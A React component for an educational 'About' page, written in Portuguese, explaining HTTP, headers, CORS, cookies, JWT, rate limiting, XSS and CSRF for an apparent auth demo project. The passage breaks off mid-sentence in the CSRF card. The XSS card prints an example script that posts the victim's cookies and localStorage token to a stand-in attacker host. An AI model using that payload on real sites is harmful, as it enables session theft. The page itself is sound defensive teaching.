import { AboutCollapse } from './Collapse'
import { AboutFlow } from './Flow'

export const About = () => (
  <div className='min-h-screen flex flex-col gap-y-[32px] bg-primary-500 p-[16px]'>
    <AboutCollapse variant='section' defaultOpen title='Informações'>
      <AboutCollapse title='HTTP'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            HTTP é o protocolo que o navegador fala com o servidor. O cliente manda uma requisição,
            o servidor devolve uma resposta, e a conexão termina ali. Tudo que existe na web,
            incluindo login, é construído em cima desse par.
          </p>

          <p>
            A característica que importa para autenticação é que o protocolo não tem memória. A
            segunda requisição não sabe nada da primeira: o servidor recebe cada uma como se fosse a
            primeira vez que aquele cliente aparece. Cookie e token existem exatamente para tapar
            esse buraco.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='Anatomia de uma requisição'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>Quatro partes: método, caminho, cabeçalhos e corpo.</p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`POST /auth/login HTTP/1.1
Host: api.site.com
Content-Type: application/json
Cookie: csrf_token=abc123
Origin: https://app.site.com

{ "email": "user@site.com", "password": "..." }`}
                  </code>
                </pre>

                <p>
                  A resposta tem a mesma forma, trocando o método pelo status:{' '}
                  <code className='text-[14px]'>HTTP/1.1 200 OK</code>, cabeçalhos como{' '}
                  <code className='text-[14px]'>Set-Cookie</code>, e o corpo em JSON.
                </p>

                <p>
                  Os cabeçalhos são o ponto sensível, e não são todos iguais: alguns o seu código
                  JavaScript escreve, outros só o Chrome escreve. Card próprio logo abaixo.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Métodos seguros e métodos que alteram estado'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <code className='text-[14px]'>GET</code>,{' '}
                  <code className='text-[14px]'>HEAD</code> e{' '}
                  <code className='text-[14px]'>OPTIONS</code> são definidos como seguros: leem, não
                  mudam nada. <code className='text-[14px]'>POST</code>,{' '}
                  <code className='text-[14px]'>PUT</code>,{' '}
                  <code className='text-[14px]'>PATCH</code> e{' '}
                  <code className='text-[14px]'>DELETE</code> alteram estado.
                </p>

                <p>
                  Isso é convenção, não regra imposta pelo protocolo. Nada impede alguém de escrever
                  um <code className='text-[14px]'>GET /users/1/delete</code> que apaga de verdade.
                </p>

                <p>
                  Só que navegador e defesas de CSRF acreditam na convenção: prefetch, cache e o
                  guard anti-CSRF tratam GET como inofensivo e não pedem token. Um GET que muta vira
                  uma porta aberta cross-site.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Status codes'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Três dígitos por família: <code className='text-[14px]'>2xx</code> deu certo,{' '}
                  <code className='text-[14px]'>3xx</code> redireciona,{' '}
                  <code className='text-[14px]'>4xx</code> o cliente errou,{' '}
                  <code className='text-[14px]'>5xx</code> o servidor errou.
                </p>

                <p>
                  Os que essa API usa com significado próprio:{' '}
                  <code className='text-[14px]'>401</code> não sei quem você é (credencial ausente,
                  expirada ou inválida), <code className='text-[14px]'>403</code> sei quem você é e
                  mesmo assim não pode (é o que o guard de CSRF devolve),{' '}
                  <code className='text-[14px]'>400</code> o corpo não passou no{' '}
                  <code className='text-[14px]'>ValidationPipe</code>,{' '}
                  <code className='text-[14px]'>409</code> conflito, como email já cadastrado.
                </p>

                <p>
                  Numa rota de login o status também vaza informação. Email inexistente e senha
                  errada devolvem o mesmo 401 e a mesma mensagem, senão o atacante descobre quais
                  emails existem só olhando a resposta.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Sem estado'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  O servidor não guarda nada entre uma requisição e outra. Se você fez login agora,
                  a próxima requisição precisa carregar a prova disso junto.
                </p>

                <p>
                  Existem dois jeitos de carregar essa prova. Um identificador de sessão, e aí o
                  servidor consulta onde guardou os dados dela. Ou um token assinado, que carrega os
                  próprios dados e dispensa a consulta. Este projeto usa a segunda opção para o
                  access token e a primeira para o refresh token, que tem linha no banco.
                </p>

                <p>
                  E os dois jeitos precisam de um lugar para morar no navegador. É onde o cookie
                  entra.
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='HTTP Headers'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            Cabeçalho é um par de nome e valor que viaja junto da requisição ou da resposta, fora do
            corpo. É onde ficam <code className='text-[14px]'>Content-Type</code>,{' '}
            <code className='text-[14px]'>Cookie</code>, <code className='text-[14px]'>Origin</code>{' '}
            e <code className='text-[14px]'>Set-Cookie</code>.
          </p>

          <p>
            Para segurança, o que importa não é a lista de nomes. É quem escreveu cada um. Parte
            deles o código da sua aplicação escolhe, parte deles só o navegador escreve, e nenhum
            código consegue trocar de lado. Toda defesa contra CSRF sai dessa divisão.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='Página e navegador'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Os dois termos aparecem o tempo todo daqui para frente, então vale fixar cada um.
                </p>

                <p>
                  <strong>Página</strong> é código JavaScript rodando dentro de uma aba. No seu
                  caso, o bundle do app Next depois de carregado no cliente. No ataque, é o script
                  de <code className='text-[14px]'>site-de-jogos.com</code>, na aba dele. Os dois
                  são página: código de alguém rodando numa aba.
                </p>

                <p>
                  <strong>Navegador</strong> é o programa: Chrome, Firefox, Safari, Edge. Ele
                  executa o JavaScript da página, mas quem monta e envia o pacote HTTP pela rede é
                  ele.
                </p>

                <p>
                  A página nunca fala com a rede direto. Ela chama{' '}
                  <code className='text-[14px]'>fetch</code>, que é uma função <em>do navegador</em>
                  , e faz um pedido. O navegador decide o que aceita desse pedido e escreve a
                  requisição final. Todo código de página roda por baixo dele.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Cabeçalhos que a página escolhe'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <code className='text-[14px]'>Content-Type</code>,{' '}
                  <code className='text-[14px]'>Accept</code>,{' '}
                  <code className='text-[14px]'>X-CSRF-Token</code> e qualquer cabeçalho
                  personalizado. O JavaScript passa o valor, o navegador copia sem discutir.
                </p>

                <p>
                  Como o script do atacante também é uma página, ele escolhe do mesmo jeito e
                  escreve o que quiser. Nenhum desses campos prova nada sozinho: o servidor lê como
                  informação, nunca como identidade.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Cabeçalhos que só o navegador escreve'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <code className='text-[14px]'>Cookie</code>,{' '}
                  <code className='text-[14px]'>Origin</code>,{' '}
                  <code className='text-[14px]'>Referer</code>,{' '}
                  <code className='text-[14px]'>Host</code>,{' '}
                  <code className='text-[14px]'>Content-Length</code> e outros. A especificação do{' '}
                  <code className='text-[14px]'>fetch</code> chama esse conjunto de nomes de
                  cabeçalho proibidos: qualquer página pode pedir, nenhuma consegue.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`fetch('https://api.site.com/users', {
  headers: {
    Origin: 'https://app.site.com',  // ignorado
    Cookie: 'access_token=roubado',  // ignorado
    'X-CSRF-Token': 'chute'          // enviado
  }
})`}
                  </code>
                </pre>

                <p>
                  Não dá erro nem aviso. O código roda, a requisição sai, e o navegador escreve
                  nesses campos o que ele mesmo apurou: o{' '}
                  <code className='text-[14px]'>Origin</code> verdadeiro da aba que fez a chamada, e
                  os cookies que ele decidiu anexar seguindo{' '}
                  <code className='text-[14px]'>Domain</code>,{' '}
                  <code className='text-[14px]'>Path</code> e{' '}
                  <code className='text-[14px]'>SameSite</code>.
                </p>

                <p>
                  Ressalva: isso não é regra do protocolo HTTP, é regra que o navegador cumpre. Um{' '}
                  <code className='text-[14px]'>curl</code> ou um script em Node ignoram a lista
                  inteira e forjam o que quiserem. Só que esses programas não têm o cookie da vítima
                  guardado, então o pedido sai anônimo. Quem tem a credencial é o navegador dela, e
                  é lá que as regras valem.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Por que isso sustenta as defesas'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <strong>
                    <code className='text-[14px]'>Origin</code> serve de prova.
                  </strong>{' '}
                  O script do atacante não consegue mentir sobre ele. Se o navegador escreveu{' '}
                  <code className='text-[14px]'>site-de-jogos.com</code>, foi de uma aba desse site
                  que a requisição saiu, e o servidor pode recusar com segurança.
                </p>

                <p>
                  <strong>
                    <code className='text-[14px]'>Cookie</code> chega sozinho.
                  </strong>{' '}
                  É a causa do CSRF existir: o navegador anexa a credencial mesmo quando quem chamou
                  foi o script do atacante. O servidor não consegue distinguir só olhando esse
                  campo.
                </p>

                <p>
                  <strong>
                    <code className='text-[14px]'>X-CSRF-Token</code> é forjável em valor, não em
                    conteúdo.
                  </strong>{' '}
                  O atacante escreve o cabeçalho, mas não sabe <em>qual</em> valor colocar, porque
                  não consegue ler cookie de outra origem. E cabeçalho personalizado em requisição
                  cross-origin obriga um preflight <code className='text-[14px]'>OPTIONS</code>, que
                  um <code className='text-[14px]'>&lt;form&gt;</code> HTML não sabe fazer. O
                  formulário invisível do card de CSRF sequer chega a tentar.
                </p>

                <p>
                  Regra curta: cabeçalho que o JavaScript escolheu apenas informa, cabeçalho que o
                  navegador escreveu prova.
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='CORS'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            A regra base do navegador é a Same-Origin Policy: código de uma origem não lê resposta
            de outra. Sem ela, qualquer site aberto numa aba leria seu email e seu banco. CORS é a
            exceção controlada, e quem autoriza é o servidor que recebe a chamada, nunca a página
            que faz.
          </p>

          <p>
            Este projeto precisa dele porque app e API vivem em hosts diferentes. Mesmo site,
            origens diferentes.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='Origem não é site'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Origem é a trinca esquema, host e porta. Qualquer diferença nas três faz outra
                  origem:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`https://app.site.com    origem A
https://api.site.com    origem B, host diferente
http://app.site.com     origem C, esquema diferente
https://app.site.com:8080  origem D, porta diferente`}
                  </code>
                </pre>

                <p>
                  Site é outra conta, feita só no domínio registrável e ignorando porta. Por isso as
                  quatro linhas acima são o mesmo site, e é isso que deixa{' '}
                  <code className='text-[14px]'>SameSite=Lax</code> funcionar aqui.
                </p>

                <p>
                  Same-site resolve cookie. Same-origin resolve leitura. As duas contas são
                  diferentes e as duas precisam ser resolvidas.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='CORS não bloqueia o envio'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  O mal-entendido mais caro da área. Numa requisição simples, o navegador manda
                  primeiro e checa depois: o servidor recebe, executa e grava no banco. Só então o
                  navegador olha o <code className='text-[14px]'>Access-Control-Allow-Origin</code>{' '}
                  e, se não bater, esconde a resposta do JavaScript.
                </p>

                <p>
                  O erro vermelho no console significa &quot;você não pode ler isto&quot;, não
                  &quot;isto não aconteceu&quot;.
                </p>

                <p>
                  Consequência direta: CORS não é defesa contra CSRF. O ataque do formulário
                  invisível nunca quis ler a resposta, ele queria a transferência. Quem barra aquilo
                  é <code className='text-[14px]'>SameSite</code>, o token de CSRF e a checagem de{' '}
                  <code className='text-[14px]'>Origin</code>.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Preflight OPTIONS'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Quando a requisição sai do feijão com arroz, o navegador pergunta antes de mandar.
                  Dispara preflight se o método for <code className='text-[14px]'>PUT</code>,{' '}
                  <code className='text-[14px]'>PATCH</code> ou{' '}
                  <code className='text-[14px]'>DELETE</code>, se o{' '}
                  <code className='text-[14px]'>Content-Type</code> for{' '}
                  <code className='text-[14px]'>application/json</code>, ou se houver header
                  personalizado como <code className='text-[14px]'>X-CSRF-Token</code>.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`OPTIONS /auth/logout
Origin: https://app.site.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: x-csrf-token

204 No Content
Access-Control-Allow-Origin: https://app.site.com
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: Content-Type, X-CSRF-Token
Access-Control-Max-Age: 600`}
                  </code>
                </pre>

                <p>
                  Aqui o preflight vira defesa de graça: um{' '}
                  <code className='text-[14px]'>&lt;form&gt;</code> HTML não sabe fazer OPTIONS nem
                  mandar header personalizado, então nem chega a tentar. E se{' '}
                  <code className='text-[14px]'>X-CSRF-Token</code> faltar em{' '}
                  <code className='text-[14px]'>Allow-Headers</code>, toda mutação do app morre no
                  preflight, antes do login sequer aparecer no log.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Credenciais endurecem as regras'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Com <code className='text-[14px]'>credentials: &apos;include&apos;</code> no
                  cliente, o navegador passa a exigir duas coisas do servidor:{' '}
                  <code className='text-[14px]'>Access-Control-Allow-Credentials: true</code> e um{' '}
                  <code className='text-[14px]'>Allow-Origin</code> com a origem exata.{' '}
                  <code className='text-[14px]'>&apos;*&apos;</code> deixa de ser aceito.
                </p>

                <p>
                  A saída preguiçosa é refletir a origem de quem chamou. É o mesmo que autorizar
                  todo mundo, com a diferença de continuar passando com credenciais: qualquer site
                  passa a ler respostas autenticadas da vítima. Isso é tomada de conta, não
                  configuração.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`app.enableCors({
  credentials: true,
  origin: corsOrigin.split(',').map((value) => value.trim()),
  allowedHeaders: ['Content-Type', 'Accept', 'X-CSRF-Token']
})`}
                  </code>
                </pre>

                <p>
                  A allowlist vem de <code className='text-[14px]'>CORS_ORIGIN</code>, validada no
                  schema de env. Lista fixa, nunca <code className='text-[14px]'>origin: true</code>
                  .
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='Cookies'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            Cookie é um pequeno par de nome e valor. O servidor pode mandar um{' '}
            <code className='text-[14px]'>Set-Cookie</code> no cabeçalho da resposta de uma
            requisição, e o navegador guarda esse valor por domínio. A partir daí ele reenvia o
            cookie sozinho em toda requisição para aquele domínio, sem o site precisar fazer nada. É
            isso que permite o servidor reconhecer você entre uma página e outra, já que HTTP em si
            não lembra de nada.
          </p>

          <p>
            O que vem depois do valor são os atributos. Eles não são enviados de volta pelo
            navegador. Servem só para ele decidir onde, quando e para quem aquele cookie vale.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='attribute' title='Name=Value'>
              O par em si, e a única parte obrigatória. É o único pedaço que volta para o servidor
              nas próximas requisições.
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='Domain'>
              Quais hosts recebem o cookie. Omitido, ele vira host-only: só o host exato que o criou
              recebe de volta. Com <code className='text-[14px]'>Domain=site.com</code>, todos os
              subdomínios recebem também. Nenhum site consegue setar cookie para um domínio que não
              é dele.
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='Path'>
              O cookie só é enviado se o caminho da URL começar com esse prefixo.{' '}
              <code className='text-[14px]'>Path=/auth</code> faz o cookie ir em{' '}
              <code className='text-[14px]'>/auth/refresh</code> e não ir em{' '}
              <code className='text-[14px]'>/users</code>. Serve para limitar o alcance de uma
              credencial, não para esconder nada.
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='Expires / Max-Age'>
              Quando o cookie morre. <code className='text-[14px]'>Max-Age</code> é em segundos e
              tem precedência sobre <code className='text-[14px]'>Expires</code>, que é uma data.
              Sem nenhum dos dois vira cookie de sessão e some quando o navegador fecha.
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='Secure'>
              Só viaja em HTTPS. Sem isso o cookie trafega em texto puro em qualquer conexão HTTP.
              Navegadores tratam <code className='text-[14px]'>localhost</code> como origem
              confiável, então continua funcionando em desenvolvimento.
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='HttpOnly'>
              JavaScript não enxerga o cookie: ele não aparece em{' '}
              <code className='text-[14px]'>document.cookie</code> e não pode ser lido nem
              sobrescrito pela página. É o que impede um XSS de roubar o valor. O navegador continua
              enviando normalmente, então o cookie fica utilizável sem ficar legível.
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='SameSite'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Decide se o cookie acompanha requisições disparadas por outro site. É a principal
                  defesa nativa contra CSRF. &quot;Site&quot; aqui é o domínio registrável:{' '}
                  <code className='text-[14px]'>app.site.com</code> e{' '}
                  <code className='text-[14px]'>api.site.com</code> são o mesmo site; a porta não
                  entra na conta.
                </p>

                <div className='flex flex-col border-l-[2px] border-primary-100 pl-[16px]'>
                  <AboutCollapse variant='option' title='Strict'>
                    Nunca vai em requisição vinda de outro site, nem quando você clica num link
                    externo. Mais seguro, mas quem chega por um link de fora aparece deslogado na
                    primeira página.
                  </AboutCollapse>

                  <AboutCollapse variant='option' title='Lax'>
                    Padrão dos navegadores hoje. Vai quando outro site te joga para cá trocando a
                    aba inteira por GET: clicar num link, um redirect, digitar a URL. Não vai quando
                    o cookie seria usado sem a aba sair do lugar (
                    <code className='text-[14px]'>fetch</code>, iframe, imagem), nem num form POST
                    vindo de fora. Como POST cross-site nunca leva o cookie, o CSRF clássico morre;
                    o que sobra é rota GET que altera estado, que continua alcançável.
                  </AboutCollapse>

                  <AboutCollapse variant='option' title='None'>
                    Vai em tudo, inclusive cross-site. Exige{' '}
                    <code className='text-[14px]'>Secure</code> junto, senão o navegador descarta o
                    cookie. Reabre CSRF por completo, então só faz sentido com token anti-CSRF e
                    checagem de <code className='text-[14px]'>Origin</code> por cima.
                  </AboutCollapse>
                </div>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='attribute' title='Partitioned'>
              Isola um cookie cross-site por site visitado: cada site que embeda o mesmo recurso
              ganha seu próprio balde, sem enxergar o dos outros. É a resposta dos navegadores ao
              rastreio entre sites, e não é necessário quando app e API dividem o mesmo domínio
              registrável.
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='JWT'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            JSON Web Token é um formato de token: uma string em três partes separadas por ponto,
            cada uma codificada em base64url. Ele carrega dados sobre quem é o usuário e uma
            assinatura que prova que esses dados saíram do seu servidor.
          </p>

          <p>
            A promessa é conseguir verificar um token sem consultar o banco. O servidor recalcula a
            assinatura com o segredo que só ele tem: bateu, o conteúdo é confiável e a requisição
            segue. Isso é rápido, e é também a origem do principal problema dele.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='Estrutura'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <code className='text-[14px]'>header.payload.signature</code>, na prática algo
                  assim:
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
.eyJzdWIiOiJ1c2VyLTEyMyIsImV4cCI6MTczMDAwMDAwMH0
.5mB1qF9s0kQ2wZxV8tYnJhLpR3cD7eGaKoU4vXsPzMw`}
                  </code>
                </pre>

                <p>
                  O header diz o algoritmo (<code className='text-[14px]'>alg</code>) e o tipo. O
                  payload traz as claims. A assinatura é um HMAC do header mais o payload usando o
                  segredo do servidor.
                </p>

                <p>
                  Alterar qualquer caractere do payload invalida a assinatura, então o conteúdo não
                  pode ser adulterado por quem não tem o segredo.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Assinatura não é criptografia'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  base64url não esconde nada. Qualquer pessoa com o token cola em um decodificador e
                  lê o payload inteiro, sem segredo nenhum. A assinatura garante integridade, não
                  sigilo.
                </p>

                <p>
                  Consequência prática: nunca coloque no payload senha, hash de senha, CPF, dado
                  interno. Só o id do usuário e claims de controle.
                </p>

                <p>
                  E é por isso que o token viaja em cookie{' '}
                  <code className='text-[14px]'>HttpOnly</code> neste projeto. Não porque o conteúdo
                  seja secreto, mas porque quem tem a string tem a sessão: o token <em>é</em> a
                  credencial.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Claims'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>Os campos do payload. Os padronizados que essa API assina e verifica:</p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`{
  "sub": "user-123",        // dono do token
  "iss": "secure-auth-api", // quem emitiu
  "aud": "access",          // para que serve: access ou refresh
  "jti": "a1b2c3",          // id único deste token
  "iat": 1730000000,        // emitido em
  "exp": 1730000900         // expira em
}`}
                  </code>
                </pre>

                <p>
                  <code className='text-[14px]'>aud</code> é o que separa access de refresh, e por
                  isso é verificado, não só assinado. Sem essa checagem um refresh token de 14 dias
                  passa como access token.
                </p>

                <p>
                  <code className='text-[14px]'>jti</code> é o id da linha de{' '}
                  <code className='text-[14px]'>RefreshToken</code> no banco. Apagar a linha revoga
                  aquele token específico, e é também sobre esse valor que o token de CSRF é
                  assinado.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Verificação e o problema da revogação'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>Na verificação, três coisas não são opcionais:</p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`jwtService.verifyAsync(token, {
  secret: accessSecret,      // segredo separado por tipo de token
  algorithms: ['HS256'],     // algoritmo fixado
  issuer: 'secure-auth-api',
  audience: 'access'
})`}
                  </code>
                </pre>

                <p>
                  Fixar o algoritmo evita que um token forjado escolha o algoritmo por conta
                  própria. Segredos separados por tipo evitam que um check esquecido transforme
                  refresh em access. E a falha volta sempre como 401 genérico: dizer
                  &quot;expirado&quot; em vez de &quot;assinatura inválida&quot; entrega informação
                  de graça.
                </p>

                <p>
                  O problema: um JWT válido continua válido até o{' '}
                  <code className='text-[14px]'>exp</code> e o servidor não tem onde marcá-lo como
                  morto, já que não consulta nada para verificar. Logout não consegue apagar um
                  token que já está no navegador.
                </p>

                <p>
                  A saída é o par de tokens. O access vale 15 minutos, então uma revogação demora no
                  máximo isso para valer. O refresh vale 14 dias mas tem linha no banco, e nesse a
                  revogação é imediata: apagar a linha basta.
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='Rate limiting'>
        <div className='flex flex-col gap-y-[24px]'>
          <p>
            Nada do que veio antes impede alguém de simplesmente tentar. Senha certa entra, e um
            script paciente testa milhares por minuto até achar uma. Rate limiting é o que
            transforma &quot;infinitas tentativas&quot; em &quot;algumas tentativas&quot;.
          </p>

          <p>
            Vale para login, registro e refresh, que são as rotas onde tentar de novo tem valor para
            o atacante.
          </p>

          <div className='flex flex-col'>
            <AboutCollapse variant='item' title='Baseline global mais limite por rota'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Duas camadas: um teto largo para toda a API, que segura abuso genérico, e um teto
                  apertado nas rotas de autenticação.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>
                    {`// global
ThrottlerModule.forRoot([{ ttl: 60_000, limit: 100 }])

// na rota de login
@Throttle({ default: { ttl: 60_000, limit: 5 } })
@Post('login')`}
                  </code>
                </pre>

                <p>
                  Cinco tentativas por minuto não incomoda quem errou a senha duas vezes, e derruba
                  um script que dependia de milhares.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Por IP não é suficiente'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Limite por IP resolve um atacante numa máquina. Não resolve credential stuffing,
                  que é o ataque real hoje: uma lista de emails e senhas vazados de outro site,
                  testada a partir de milhares de IPs residenciais, uma tentativa em cada.
                </p>

                <p>
                  Cada IP fica bem abaixo do limite e o ataque inteiro passa. Por isso existe o
                  segundo contador, por conta: falhas consecutivas no mesmo email, independente de
                  onde vieram, e bloqueio temporário quando estoura.
                </p>

                <p>
                  Os dois contam coisas diferentes. Por IP mede &quot;esta máquina está tentando
                  demais&quot;, por conta mede &quot;esta conta está sendo atacada&quot;.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='Atrás de proxy'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  Em produção quem fala com a API é o load balancer, então todo request chega com o
                  IP dele. Sem configurar, o limitador vê um cliente só e o primeiro usuário a errar
                  a senha bloqueia todos os outros.
                </p>

                <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
                  <code>{"app.set('trust proxy', 1)"}</code>
                </pre>

                <p>
                  O <code className='text-[14px]'>1</code> é o número de proxies confiáveis à
                  frente. Confiar em mais camadas do que existem é pior que não confiar em nenhuma:
                  o cliente passa a poder inventar o próprio{' '}
                  <code className='text-[14px]'>X-Forwarded-For</code> e trocar de identidade a cada
                  tentativa.
                </p>
              </div>
            </AboutCollapse>

            <AboutCollapse variant='item' title='O que responder ao estourar'>
              <div className='flex flex-col gap-y-[12px]'>
                <p>
                  <code className='text-[14px]'>429 Too Many Requests</code>, com{' '}
                  <code className='text-[14px]'>Retry-After</code> dizendo em quantos segundos vale
                  tentar de novo. Cliente honesto usa a informação, script ignora e continua batendo
                  na parede.
                </p>

                <p>
                  Detalhe fácil de errar: o limitador não pode virar oráculo. Se o bloqueio por
                  conta só aparece para email cadastrado, o 429 vira a resposta que diz quais emails
                  existem, desfazendo o cuidado do 401 genérico e do hash de mentira.
                </p>

                <p>
                  E rate limiting não substitui o custo do bcrypt. Ele limita tentativas contra a
                  API; o cost factor é o que segura quem já levou o banco de hashes embora e testa
                  offline, onde nenhum limite seu alcança.
                </p>
              </div>
            </AboutCollapse>
          </div>
        </div>
      </AboutCollapse>
    </AboutCollapse>

    <AboutCollapse variant='section' defaultOpen title='Ataques'>
      <AboutCollapse title='XSS'>
        <div className='flex flex-col gap-y-[16px]'>
          <p>
            Cross-Site Scripting é quando um atacante consegue fazer a sua aplicação servir um
            JavaScript dele. O código roda no navegador da vítima, mas dentro da sua origem e com os
            mesmos poderes do seu próprio código: lê o DOM, lê{' '}
            <code className='text-[14px]'>localStorage</code>, dispara requisições usando a sessão
            dela e altera o que ela vê na tela.
          </p>

          <p>
            Quase sempre entra por dado de usuário renderizado como HTML em vez de texto: um
            comentário, um nome de perfil, um parâmetro de URL. Basta que em algum ponto o conteúdo
            deixe de ser tratado como string e vire marcação de verdade.
          </p>

          <div className='flex flex-col gap-y-[12px] border-l-[2px] border-primary-100 pl-[16px]'>
            <p>
              <strong>O cenário.</strong> Um fórum onde qualquer usuário pode postar comentários em
              um tópico.
            </p>

            <p>
              <strong>A vulnerabilidade.</strong> O desenvolvedor renderiza o texto do comentário
              direto no HTML, usando algo equivalente a{' '}
              <code className='text-[14px]'>innerHTML</code>, em vez de converter o conteúdo para
              texto puro.
            </p>

            <p>
              <strong>O ataque.</strong> O atacante escreve um comentário que não é texto, é código:
            </p>

            <pre className='overflow-x-auto rounded-[8px] bg-gray-100 p-[16px] text-[13px] leading-[1.5]'>
              <code>
                {`<script>
  fetch('https://site-do-atacante.com/roubar', {
    method: 'POST',
    body: JSON.stringify({
      cookie: document.cookie,
      token: localStorage.getItem('token')
    })
  })
</script>`}
              </code>
            </pre>

            <p>
              <strong>A execução.</strong> Quando a vítima abre aquele tópico, o navegador lê a tag{' '}
              <code className='text-[14px]'>&lt;script&gt;</code> vinda do servidor do fórum e
              executa. O JavaScript roda com permissões totais dentro do domínio do fórum, acessa
              cookies e <code className='text-[14px]'>localStorage</code>, e manda o token da vítima
              para o servidor do atacante.
            </p>

            <p>
              Repare que o script chegou pelo próprio fórum. Para o navegador ele é indistinguível
              do código legítimo do site. Está na mesma origem, então tem os mesmos direitos.
            </p>
          </div>
        </div>
      </AboutCollapse>

      <AboutCollapse title='CSRF'>
        <div className='flex flex-col gap-y-[16px]'>
          <p>
            Cross-Site Request Forgery é o inverso do XSS: o código fica no site do atacante, não no
            seu. Ele publica uma página em outro domínio e espera a vítima, alguém já logado na sua
            aplicação, abrir essa página. Quem dispara a requisição para a API é o{' '}
            <strong>navegador da vítima</strong>, e como o navegador anexa os cookies de sessão
            sozinho, o servidor vê um pedido legítimo dela.
          </p>

          <p>
            É um ataque cego. A resposta chega no navegador da vítima, não no atacante. A página
            dele está em outra origem e a Same-Origin Policy impede que ela leia o resultado. Por
            isso CSRF serve para <strong>executar ação em nome da vítima</strong> (trocar senha,
            transferir, deletar), não para roubar dados.
          </p>

          <div className='flex flex-col gap-y-[12px] border-l-[2px] border-primary-100 pl-[16px]'>
            <p>
              <strong>O cenário.</strong> Você está logado no seu banco online (
              <code className='text-[14px]'>banco.com</code>) e o cookie de sessão está salvo no seu
              navegador. O banco tem um endpoint de transferência:{' '}
              <code className='text-[14px]'>POST /api/transferir</code>, com body{' '}
              <code className='text-[14px]'>{'{ "para": "conta123", "valor": 1000 }'}</code>.
            </p>

            <p>
              <strong>A vulnerabilidade.</strong> O servidor autentica a requisição exclusivamente
